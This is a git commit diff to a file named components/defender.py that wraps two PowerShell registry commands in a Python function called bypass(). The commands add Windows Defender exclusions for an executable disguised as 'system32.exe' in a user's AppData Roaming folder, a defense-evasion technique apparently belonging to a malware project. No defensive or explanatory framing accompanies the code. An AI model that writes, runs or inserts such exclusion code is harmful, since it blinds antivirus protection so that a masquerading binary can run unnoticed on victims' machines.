ba62fe37654f50dd42e269ad66da73beb30ed757
Gravity <137218519+gravitacia@users.noreply.github.com>
2025-10-08 23:20:08 +0400

    Update defender.py

--- components/defender.py
+++ components/defender.py
@@ -1,8 +1,11 @@
-import subprocess, requests
-commands = [
-    'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" -Name "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\system32.exe" -Value 0 -PropertyType DWORD',
-    'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" -Name "system32.exe" -Value 0 -PropertyType DWORD',
-]
+import subprocess
+import requests
 
-for command in commands:
-    result = subprocess.run(["powershell", "-Command", command])
+def bypass():
+    commands = [
+        'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" -Name "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\system32.exe" -Value 0 -PropertyType DWORD',
+        'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" -Name "system32.exe" -Value 0 -PropertyType DWORD',
+    ]
+
+    for command in commands:
+        result = subprocess.run(["powershell", "-Command", command])
